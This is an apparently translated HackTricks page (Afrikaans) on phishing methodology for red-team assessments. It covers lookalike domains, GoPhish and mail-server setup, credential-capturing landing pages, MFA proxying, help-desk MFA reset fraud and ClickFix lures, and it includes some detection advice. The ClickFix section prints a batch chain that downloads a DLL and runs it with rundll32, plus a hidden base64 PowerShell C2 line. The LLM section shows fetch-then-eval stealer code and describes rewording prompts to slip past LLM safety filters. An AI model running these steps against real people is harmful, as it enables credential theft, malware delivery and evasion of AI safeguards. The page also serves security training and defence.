# Phishing Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Recon the victim
1. Kies die **slagoffer-domein**.
2. Voer basiese web-enumerasie uit deur **na login-portale te soek** wat deur die slagoffer gebruik word en **besluit** watter een jy gaan **impersonate**.
3. Gebruik 'n bietjie **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
1. **Koop die domein** wat jy gaan gebruik vir die phishing-assessering
2. **Konfigureer die e-posdiens** verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die veldtog voor
1. Berei die **e-pos-sjabloon** voor
2. Berei die **webblad** voor om die **inlogbewyse** te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop 'n vertroude domein

### Domain Name Variation Techniques

- **Keyword**: Die domeinnaam **bevat** 'n belangrike **keyword** van die oorspronklike domein (e.g., zelster.com-management.com).
- **hypened subdomain**: Vervang die **punt met 'n koppelteken** in 'n subdomein (e.g., www-zelster.com).
- **New TLD**: Dieselfde domein met 'n **nuwe TLD** (e.g., zelster.org)
- **Homoglyph**: Dit **vervang** 'n letter in die domeinnaam met **letters wat soortgelyk lyk** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters om** binne die domeinnaam (e.g., zelsetr.com).
- **Singularization/Pluralization**: Voeg 's' by of verwyder dit aan die einde van die domeinnaam (e.g., zeltsers.com).
- **Omission**: Dit **verwyder een** van die letters uit die domeinnaam (e.g., zelser.com).
- **Repetition:** Dit **herhaal een** van die letters in die domeinnaam (e.g., zeltsser.com).
- **Replacement**: Soortgelyk aan homoglyph maar minder stealthy. Dit vervang een van die letters in die domeinnaam, dalk met 'n letter naby die oorspronklike letter op die sleutelbord (e.g, zektser.com).
- **Subdomained**: Voeg 'n **punt** binne die domeinnaam in (e.g., ze.lster.com).
- **Insertion**: Dit **invoeg 'n letter** in die domeinnaam (e.g., zerltser.com).
- **Missing dot**: Heg die TLD aan die domeinnaam (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is 'n **moontlikheid dat een of meer bis wat gestoor is of in kommunikasie is outomaties geflip kan word** weens verskeie faktore soos sonvlamme, kosmiese strale of hardeware-foute.

Wanneer hierdie konsep op **DNS-versoeke** toegepas word, is dit moontlik dat die **domein soos ontvang deur die DNS-bediener** nie dieselfde is as die domein oorspronklik versoek nie.

Byvoorbeeld, 'n enkele bit-wysiging in die domein "windows.com" kan dit verander na "windnws.com."

Aanvallers kan **hierdie verskil misbruik deur verskeie bit-flipping domeine te registreer** wat soortgelyk is aan die slagoffer se domein. Hul doel is om regmatige gebruikers na hul eie infrastruktuur te herlei.

Vir meer inligting lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Koop 'n vertroude domein

Jy kan soek op [https://www.expireddomains.net/](https://www.expireddomains.net) vir 'n vervalde domein wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **alreeds 'n goeie SEO het** kan jy kyk hoe dit gekategoriseer word by:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdekking van e-posadresse

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek** of diegene wat jy reeds gevind het te verifieer, kan jy nagaan of jy hulle op die SMTP-bedieners van die slagoffer kan brute-force. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Verder, moenie vergeet dat as gebruikers **enige webportaal gebruik om hul e-posse te bekom** nie, jy kan nagaan of dit kwesbaar is vir **username brute force**, en die kwesbaarheid uitbuit indien moontlik.

## Configuring GoPhish

### Installasie

Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en pak dit uit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit.\
Jy sal 'n wagwoord vir die admin-gebruiker in die uitvoer kry vir poort 3333. Toegang daardie poort en gebruik daardie geloofsbriewe om die admin-wagwoord te verander. Jy mag nodig hê om daardie poort na lokaal te tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS sertifikaatkonfigurasie**

Voor hierdie stap behoort jy **reeds die domein gekoop te hê** wat jy gaan gebruik, en dit moet **wys na die IP van die VPS** waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**E-pos konfigurasie**

Begin die installasie: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Laastens wysig die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou 'n **DNS A record** vir `mail.<domain>` wat na die **ip address** van die VPS wys en 'n **DNS MX** record wat na `mail.<domain>` wys

Kom ons toets nou om 'n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfigurasie**

Stop die uitvoering van gophish en laat ons dit konfigureer.\
Wysig `/opt/gophish/config.json` soos volg (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish service**

Om die gophish service te skep sodat dit outomaties begin kan word en as 'n service bestuur kan word, kan jy die lêer `/etc/init.d/gophish` skep met die volgende inhoud:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die konfigurasie van die diens en kontroleer dit deur die volgende te doen:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer e-posbediener en domein

### Wag & wees geloofwaardig

Hoe ouer 'n domein is, hoe minder waarskynlik is dit dat dit as spam gevang sal word. Jy behoort dus so lank as moontlik te wag (ten minste 1 week) voor die phishing assessering. Verder, as jy 'n blad oor 'n reputasionele sektor plaas, sal die bekomde reputasie beter wees.

Let wel: selfs al moet jy 'n week wag, kan jy alles nou reeds konfigureer.

### Konfigureer Reverse DNS (rDNS) rekord

Stel 'n rDNS (PTR) rekord wat die IP adres van die VPS na die domeinnaam oplos.

### Sender Policy Framework (SPF) rekord

Jy moet **'n SPF rekord vir die nuwe domein konfigureer**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

You can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS machine)

![](<../../images/image (1037).png>)

Dit is die inhoud wat binne 'n TXT record in die domein gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Rekord

Jy moet **'n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet 'n nuwe DNS TXT-rekord skep wat na die hostname `_dmarc.<domain>` wys met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein opstel**. As jy nie weet wat 'n DMARC rekord is nie [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Jy moet beide B64-waardes wat die DKIM sleutel genereer, aan mekaar koppel:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Jy kan dit doen met [https://www.mail-tester.com/](https://www.mail-tester.com)\
Gaan net na die bladsy en stuur 'n e-pos na die adres wat hulle vir jou gee:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook **kontroleer jou e-poskonfigurasie** deur 'n e-pos te stuur na `check-auth@verifier.port25.com` en **die reaksie te lees** (hiervoor sal jy **oopmaak** port **25** en die reaksie in die lêer _/var/mail/root_ sien as jy die e-pos as root stuur).\
Kontroleer dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook 'n **boodskap na 'n Gmail-rekening wat jy beheer** stuur en die **e-pos se headers** in jou Gmail-inboks nagaan, `dkim=pass` moet teenwoordig wees in die `Authentication-Results` headerveld.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Verwyder uit Spamhouse-swartlys

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwyder uit Microsoft-swartlys

Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish-veldtog

### Stuurprofiel

- Gee 'n **naam om te identifiseer** vir die senderprofiel
- Bepaal vanaf watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan gebruikersnaam en wagwoord leeg laat, maar maak seker om die Ignore Certificate Errors aan te vink

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**" funksionaliteit te gebruik om te toets dat alles werk.\
> Ek beveel aan om **send the test emails to 10min mails addresses** om te voorkom dat jy tydens toetse op 'n swartlys beland.

### E-pos Sjabloon

- Gee 'n **naam om te identifiseer** vir die sjabloon
- Skryf dan 'n **onderwerp** (niks vreemds, net iets wat jy sou verwag om in 'n gewone e-pos te lees)
- Maak seker dat jy die **Add Tracking Image** aangevink het
- Skryf die **e-possjabloon** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om 'n handtekening van 'n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur 'n e-pos na 'n **nie-bestaande adres** en kyk of die reaksie enige handtekening het.
- Soek na **openbare e-posadresse** soos info@ex.com of press@ex.com of public@ex.com en stuur hulle 'n e-pos en wag vir die reaksie.
- Probeer om **'n geldige ontdekte** e-pos te kontak en wag vir die reaksie

![](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM-challenges wil steel deur sommige spesiaal vervaardigde lêers/dokumente, [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf 'n **naam**
- **Skryf die HTML-kode** van die webblad. Neem kennis dat jy webbladsye kan **importeer**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel 'n **omleiing (redirection)**

![](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die blad moet wysig en plaaslike toetse uitvoer (dalk met 'n Apache-bediener) **tot jy tevrede is met die resultate.** Dan plak daardie HTML-kode in die blokkie.\
> Neem kennis dat as jy sommige statiese hulpbronne vir die HTML nodig het (dalk CSS en JS bladsye) jy dit kan stoor in _**/opt/gophish/static/endpoint**_ en dan toegang daartoe kry vanaf _**/static/\<filename>**_

> [!TIP]
> Vir die omleiing kan jy die gebruikers **omlei na die legit hoofwebblad** van die slagoffer, of hulle na _/static/migration.html_ stuur byvoorbeeld, sit 'n **spinnende wiel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes en dui dan aan dat die proses suksesvol was**.

### Users & Groups

- Stel 'n naam
- **Import the data** (neem kennis dat om die template vir die voorbeeld te gebruik jy die firstname, last name en email address van elke gebruiker nodig het)

![](<../../images/image (163).png>)

### Campaign

Uiteindelik, skep 'n campaign en kies 'n naam, die email template, die landing page, die URL, die sending profile en die group. Neem kennis dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Neem ook kennis dat die **Sending Profile toelaat om 'n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos gaan lyk**:

![](<../../images/image (192).png>)

> [!TIP]
> Ek sou aanbeveel om **toets-e-posse na 10min mails adresse** te stuur om te verhoed dat jy swartlys geraak word tydens toetse.

Sodra alles gereed is, begin net die campaign!

## Website Cloning

As jy om enige rede die webwerf wil kloon, kyk na die volgende blad:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assessments (hoofsaaklik vir Red Teams) wil jy ook **lêers stuur wat 'n soort backdoor bevat** (dalk 'n C2 of dalk net iets wat 'n autentisering sal veroorsaak).\
Kyk na die volgende blad vir voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is baie slim aangesien jy 'n regte webwerf naboots en die inligting wat die gebruiker invul versamel. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie of as die toepassing wat jy nageboots het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die mislei gebruiker te impersonate nie**.

Hier kom gereedskap soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) van pas. Hierdie gereedskap laat jou toe om 'n MitM-agtige aanval te genereer. Basies werk die aanval op die volgende manier:

1. Jy **nar die login** form van die regte webblad.
2. Die gebruiker **stuur** sy **credentials** na jou vals blad en die gereedskap stuur dit na die regte webblad, **kontroleer of die credentials werk**.
3. As die rekening met **2FA** gekonfigureer is, sal die MitM-blad daarvra en sodra die **gebruiker dit invoer** sal die gereedskap dit aan die regte webblad stuur.
4. Sodra die gebruiker geënkripteer is, sal jy (as aanvaller) **die credentials, die 2FA, die cookie en enige inligting** van elke interaksie wat plaasvind terwyl die gereedskap 'n MitM uitvoer, gevang hê.

### Via VNC

Wat as in plaas daarvan om **die slagoffer na 'n kwaadwillige blad** met dieselfde voorkoms as die oorspronklike te stuur, jy hom na 'n **VNC-sessie met 'n blaaier wat aan die regte webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die MFA gebruik, die cookies...\
Jy kan dit doen met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Oënskynlik is een van die beste maniere om te weet of jy ontbloot is om **jou domein in swartlyslyste te soek**. As dit gelys verskyn, is jou domein op een of ander manier as verdag bespeur.\
Een maklike manier om na te gaan of jou domein in enige swartlys voorkom is om [https://malwareworld.com/](https://malwareworld.com) te gebruik

Daar is egter ander maniere om te weet of die slagoffer **aktiwies soek na verdagte phishing-aktiwiteit in die wild** soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **'n domein koop met 'n baie soortgelyke naam** aan die slagoffer se domein **en/of 'n sertifikaat genereer** vir 'n **subdomein** van 'n domein wat jy beheer **wat die sleutelwoord van die slagoffer se domein bevat**. As die **slagoffer** enige tipe **DNS of HTTP interaksie** met hulle doen, sal jy weet dat **hy aktief soek** na verdagte domeine en jy sal baie stil moet wees.

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious) om te evalueer of jou e-pos in die spam-lêer gaan eindig of of dit geblokkeer of suksesvol gaan wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend e-pos lokvalle oor en **teiken direk die service-desk / identity-recovery workflow** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operateur geldige credentials het, pivot hulle met ingeboude admin-instrumente – geen malware is nodig nie.

### Attack flow
1. Recon die slagoffer
* Versamel persoonlike & korporatiewe besonderhede vanaf LinkedIn, data breaches, publieke GitHub, ens.
* Identifiseer hoë-waarde identiteite (uitvoerende beamptes, IT, finansies) en enumereer die **presiese help-desk proses** vir wagwoord / MFA-herstel.
2. Real-time social engineering
* Bel, gebruik Teams of chat die help-desk terwyl jy die teiken impersonate (dikwels met **gespoofde caller-ID** of **geklone stem**).
* Verskaf die vooraf-versamelde PII om kennisgebaseerde verifikasie te slaag.
* Oortuig die agent om die **MFA-secret te reset** of 'n **SIM-swap** op 'n geregistreerde mobiele nommer uit te voer.
3. Onmiddellike post-access aksies (≤60 min in werklike gevalle)
* Vestig 'n voetspoor deur enige web SSO-portal.
* Enumereer AD / AzureAD met ingeboude gereedskap (geen binaries word gelaat):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement met **WMI**, **PsExec**, of legitieme **RMM** agents wat reeds in die omgewing op die witlys is.

### Detection & Mitigation
* Behandel help-desk identity recovery as 'n **geprivilegieerde operasie** – vereis step-up auth & bestuurdergoedkeuring.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA** reëls wat waarsku by:
* MFA-metode verander + authenticatie vanaf nuwe toestel / geo.
* Onmiddellike opgradering van dieselfde prinsipal (user-→-admin).
* Neem help-desk oproepe op en handhaaf 'n **call-back na 'n reeds-geregistreerde nommer** voordat enige reset plaasvind.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat pas herstelde rekeninge **nie** automatisch hoë-privilege tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews kompenseer die koste van high-touch operasies met massale aanvalle wat **search engines & ad networks in die afleweringskanaal omskakel**.

1. **SEO poisoning / malvertising** druk 'n vals resultaat soos `chromium-update[.]site` bo-aan die soekadvertensies.
2. Slagoffer laai 'n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde gesien deur Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Die loader exfiltreer blaaiercookies + credential DBs, en trek dan 'n **silent loader** wat in realtime besluit of dit gaan inisieer:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistentie-komponent (registry Run key + scheduled task)

### Hardening tips
* Blokkeer nuut-geregistreerde domeine & voer **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-pos.
* Beperk sagteware-installasie tot gesigneerde MSI / Store-pakkette, weier `HTA`, `ISO`, `VBS` uitvoering per beleid.
* Monitor vir child processes van blaaiers wat installers oopmaak:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Jaag vir LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: geklone nasionale CERT-advies met 'n **Update** knoppie wat stap-vir-stap “fix” instruksies wys. Slagoffers word vertel om 'n batch te hardloop wat 'n DLL aflaai en dit uitvoer via `rundll32`.
* Tipiese batch-ketting waargeneem:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` laat die payload in `%TEMP%` val, 'n kort slaap verberg netwerkjitter, dan roep `rundll32` die geëxporteerde entrypoint (`notepad`).
* Die DLL beacon host-identiteit en peil C2 elke paar minute. Afstandsopdragte kom as **base64-gekodeerde PowerShell** wat verborgen en met policy bypass uitgevoer word:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2-veelsydigheid (bediener kan take wissel sonder om die DLL te werk) en verberg konsole-vensters. Jaag vir PowerShell-kindprosesse van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
* Verdedigers kan soek na HTTP(S) callbacks van die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minuut peilintervalle na DLL-laai.

---

## AI-Enhanced Phishing Operations
Aanvallers ketting nou **LLM & voice-clone APIs** vir volledig gepersonaliseerde lokvalle en real-time interaksie.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Genereer & stuur >100 k e-posse / SMS met gerandomiseerde bewoording & opvolgskakels.|
|Generative AI|Skep *eenmalige* e-posse wat verwys na publieke M&A, binnenskop-grappe vanaf sosiale media; deep-fake CEO-stem in callback-bedrog.|
|Agentic AI|Registreer outonomies domeine, scrape open-source intelligensie, vervaardig volgende-fase e-posse wanneer 'n slagoffer klik maar nie creds indien nie.|

**Defence:**
• Voeg **dinamiese banners** by wat boodskappe van onbetroubare automatisering beklemtoon (via ARC/DKIM anomalieë).
• Ontplooi **stem-biometriese challenge phrases** vir hoë-risiko telefoonaansoeke.
• Simuleer voortdurend AI-gegenereerde lokvalle in bewustheidsprogramme – statiese templates is verouderd.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Aanvallers kan skynbaar onskuldige HTML stuur en die **stealer tydens runtime genereer** deur 'n **betroubare LLM API** vir JavaScript te vra, en dit dan in-blaaier uit te voer (bv. `eval` of dinamiese `<script>`).

1. **Prompt-as-obfuscation:** enkodeer exfil-URLs/Base64-stringe in die prompt; iterasie van bewoording om veiligheidsfilters te omseil en hallucinasies te verminder.
2. **Client-side API call:** by laai roep JS 'n publieke LLM (Gemini/DeepSeek/etc.) of 'n CDN-proxy aan; net die prompt/API-aanroep is in die statiese HTML.
3. **Assemble & exec:** concatenasie van die reaksie en uitvoer daarvan (polimorfies per besoek):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** Gegenereerde kode personaliseert die lokmiddel (bv. LogoKit token parsing) en posts creds na die prompt-hidden endpoint.

**Ontduikingskenmerke**
- Verkeer tref bekende LLM-domeine of betroubare CDN-proxies; soms via WebSockets na 'n backend.
- Geen statiese payload; kwaadwillige JS bestaan slegs ná render.
- Nie-deterministiese generasies produseer **unieke** stealers per sessie.

**Deteksie-idees**
- Laat sandboxes met JS aangeskakel loop; vlag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Soek na front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggekeerde teks.
- Waarsku op nie-gesanctioneerde LLM-domeine in kliëntverkeer plus daaropvolgende credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Behalwe vir klassieke push-bombing, dwing operateurs eenvoudig **forceer 'n nuwe MFA-registrasie** tydens die helpdesk-oproep, waardeur die gebruiker se bestaande token nietig gemaak word. Enige daaropvolgende aanmeldprompt lyk legitiem vir die slagoffer.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Moniteer AzureAD/AWS/Okta‑gebeurtenisse waar **`deleteMFA` + `addMFA`** binne minute vanaf dieselfde IP plaasvind.

## Clipboard Hijacking / Pastejacking

Aanvallers kan stilweg kwaadwillige opdragte na die slagoffer se clipboard kopieer vanaf 'n gekompromitteerde of typosquatted webblad, en dan die gebruiker mislei om dit in te plak binne **Win + R**, **Win + X** of 'n terminal window, wat willekeurige kode uitvoer sonder enige aflaai of aanhangsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* Die APK sluit statiese credentials en per‑profiel “unlock codes” in (geen server auth). Slagoffers volg 'n valse eksklusiwiteitsvloei (login → locked profiles → unlock) en, by korrekte kodes, word hulle herlei na WhatsApp‑geselsies met aanvaller-beheerde `+92`‑nommers terwyl spyware stilweg loop.
* Versameling begin selfs voor login: onmiddellike exfil van **device ID**, kontakte (as `.txt` vanaf cache), en dokumente (images/PDF/Office/OpenXML). 'n content observer laai nuwe foto's outomaties op; 'n geskeduleerde job skandeer elke **5 minute** weer vir nuwe dokumente.
* Persistensie: registreer vir `BOOT_COMPLETED` en hou 'n **foreground service** lewendig om herlaai en agtergrond‑verwyderings te oorleef.

### WhatsApp device-linking hijack via QR social engineering
* 'n lure‑blad (bv. valse ministerie/CERT “channel”) wys 'n WhatsApp Web/Desktop QR en beveel die slagoffer om dit te scan, en voeg stilweg die aanvaller by as 'n **linked device**.
* Die aanvaller kry onmiddellik sigbaarheid oor chats/kontakte totdat die sessie verwyder word. Slagoffers mag later 'n “new device linked” kennisgewing sien; verdedigers kan jaag na onverwagte device‑link gebeure kort daarna ná besoeke aan onbetroubare QR‑bladsye.

### Mobile‑gated phishing to evade crawlers/sandboxes
